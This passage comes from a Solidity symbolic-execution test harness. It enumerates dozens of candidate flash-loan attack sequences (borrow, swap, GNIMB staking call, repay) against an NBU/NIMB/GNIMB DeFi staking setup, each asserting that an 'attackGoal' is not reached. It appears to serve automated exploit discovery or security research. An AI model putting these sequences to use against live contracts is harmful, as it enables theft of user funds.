        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1136(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1137(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1138(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1139(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1140(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1141(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1142(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1143(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1144(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1145(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1146(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1147(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1148(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1149(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1150(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1151(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1152(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1153(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1154(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1155(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1156(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1157(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1158(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1159(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1160(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1161(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1162(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1163(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1164(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1165(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1166(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1167(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1168(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1169(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1170(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1171(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1172(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1173(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1174(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1175(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1176(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1177(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1178(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1179(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1180(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1181(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1182(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1183(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1184(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1185(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1186(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1187(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
